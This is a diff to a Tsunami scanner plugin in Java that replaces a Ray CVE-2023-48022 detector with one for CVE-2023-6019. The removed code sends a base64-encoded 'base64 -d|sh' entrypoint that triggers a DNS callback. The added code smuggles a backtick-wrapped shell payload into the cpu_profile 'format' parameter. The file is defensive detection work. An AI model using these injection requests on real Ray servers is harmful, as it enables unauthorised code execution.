@@ -13,21 +13,18 @@
  * See the License for the specific language governing permissions and
  * limitations under the License.
  */
-package com.google.tsunami.plugins.cve202348022;
+package com.google.tsunami.plugins.cve20236019;
 
 import static com.google.common.base.Preconditions.checkNotNull;
 import static com.google.common.collect.ImmutableList.toImmutableList;
-import static java.nio.charset.StandardCharsets.UTF_8;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.common.io.BaseEncoding;
-import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
-import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.tsunami.common.net.http.HttpRequest;
+import com.google.tsunami.common.net.http.HttpResponse;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -49,16 +46,16 @@ import java.time.Clock;
 import java.time.Instant;
 import javax.inject.Inject;
 
-/** A VulnDetector plugin for CVE 202348022. */
+/** A VulnDetector plugin for CVE 20236019. */
 @PluginInfo(
     type = PluginType.VULN_DETECTION,
-    name = "CVE-2023-48022 Detector",
+    name = "CVE-2023-6019 Detector",
     version = "0.1",
-    description = "This detector checks for occurrences of CVE-2023-48022 in ray installations.",
-    author = "Marius Steffens (mariussteffens@google.com)",
-    bootstrapModule = Cve202348022DetectorModule.class)
+    description = "Checks for occurrences of CVE-2023-6019 in ray installations.",
+    author = "Viviana Sutedjo (vsutedjo@google.com)",
+    bootstrapModule = Cve20236019DetectorModule.class)
 @ForWebService
-public final class Cve202348022Detector implements VulnDetector {
+public final class Cve20236019Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
 
   private final Clock utcClock;
@@ -66,19 +63,25 @@ public final class Cve202348022Detector implements VulnDetector {
   private final PayloadGenerator payloadGenerator;
 
   @Inject
-  Cve202348022Detector(
+  Cve20236019Detector(
       @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
     this.utcClock = checkNotNull(utcClock);
-    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
-    this.payloadGenerator = checkNotNull(payloadGenerator);
+    this.httpClient =
+        checkNotNull(httpClient, "HttpClient cannot be null.")
+            .modify()
+            .setFollowRedirects(false)
+            .build();
+    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
   }
 
   @Override
   public DetectionReportList detect(
       TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
+
     return DetectionReportList.newBuilder()
         .addAllDetectionReports(
             matchedServices.stream()
+                .filter(NetworkServiceUtils::isWebService)
                 .filter(this::isServiceVulnerable)
                 .map(networkService -> buildDetectionReport(targetInfo, networkService))
                 .collect(toImmutableList()))
@@ -86,60 +89,53 @@ public final class Cve202348022Detector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    var payload = getTsunamiCallbackHttpPayload();
+    return isRayInstance(networkService) && isRceExecutable(networkService);
+  }
 
-    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
-      logger.atWarning().log(
-          "Tsunami callback server is not setup for this environment, cannot run CVE-2023-48022"
-              + " Detector.");
+  private boolean isRayInstance(NetworkService networkService) {
+    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
+    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
+    try {
+      HttpResponse response = httpClient.send(request);
+      return response.status().isSuccess()
+          && response
+              .bodyString()
+              .map(body -> body.contains("<title>Ray Dashboard</title>"))
+              .orElse(false);
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
       return false;
     }
-
-    var requestWithPayloadOldVersion =
-        getExploitRequest(networkService, payload, "api/job_agent/jobs/");
-    var requestWithPayloadNewVersion = getExploitRequest(networkService, payload, "api/jobs/");
-
-    this.sendRequest(requestWithPayloadOldVersion, networkService);
-    this.sendRequest(requestWithPayloadNewVersion, networkService);
-
-    return payload.checkIfExecuted();
   }
 
-  private Payload getTsunamiCallbackHttpPayload() {
-    return this.payloadGenerator.generate(
-        PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
-            .setInterpretationEnvironment(
-                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
-            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
-            .build());
-  }
+  private boolean isRceExecutable(NetworkService networkService) {
+    Payload payload = generatePayload();
+    String targetUri =
+        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
+            + "worker/cpu_profile?pid=1&duration=5&native=0&format=`"
+            + payload.getPayload()
+            + "`";
+    var request = HttpRequest.get(targetUri).withEmptyHeaders().build();
 
-  private HttpRequest getExploitRequest(
-      NetworkService networkService, Payload payload, String apiEndpoint) {
-    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
-    String body = String.format("{\"entrypoint\": \"%s\"}", getShellCodeForDnsCallback(payload));
-    return HttpRequest.post(rootUrl + apiEndpoint)
-        .setHeaders(HttpHeaders.builder().addHeader("content-type", "application/json").build())
-        .setRequestBody(ByteString.copyFromUtf8(body))
-        .build();
-  }
-
-  private String getShellCodeForDnsCallback(Payload payload) {
-    String pythonDnsCallbackCode =
-        String.format(
-            "python3 -c 'import socket;socket.gethostbyname(\"%s\")'", payload.getPayload());
-    return String.format(
-        "echo %s|base64 -d|sh",
-        BaseEncoding.base64().encode(pythonDnsCallbackCode.getBytes(UTF_8)));
-  }
-
-  private void sendRequest(HttpRequest request, NetworkService networkService) {
     try {
-      this.httpClient.send(request, networkService);
+      var response = this.httpClient.send(request, networkService);
+      return payload.checkIfExecuted(response.bodyBytes());
+
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Failed to send request.");
+      return false;
     }
+  }
+
+  private Payload generatePayload() {
+    return this.payloadGenerator.generateNoCallback(
+        PayloadGeneratorConfig.newBuilder()
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+            .setInterpretationEnvironment(
+                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+            .setExecutionEnvironment(
+                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+            .build());
   }
 
   private DetectionReport buildDetectionReport(
@@ -152,16 +148,16 @@ public final class Cve202348022Detector implements VulnDetector {
         .setVulnerability(
             Vulnerability.newBuilder()
                 .setMainId(
-                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-48022"))
+                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-6019"))
                 .setSeverity(Severity.CRITICAL)
-                .setTitle("CVE-2023-48022 Arbitrary Code Execution in Ray")
+                .setTitle("CVE-2023-6019")
+                .addRelatedId(
+                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-6019"))
                 .setDescription(
-                    "An attacker can use the job upload functionality to execute arbitrary code on"
-                        + " the server hosting the ray application.")
-                .setRecommendation(
-                    "There is no patch available as this is considered intended functionality."
-                        + " Restrict access to ray to be local only, and do not expose it to the"
-                        + " network."))
+                    "An attacker can use the model upload functionality to load remote Linux"
+                        + " commands and gains code execution on the server hosting the ray"
+                        + " application.")
+                .setRecommendation("Upgrade Ray to version 2.8.0. or later."))
         .build();
   }
 }
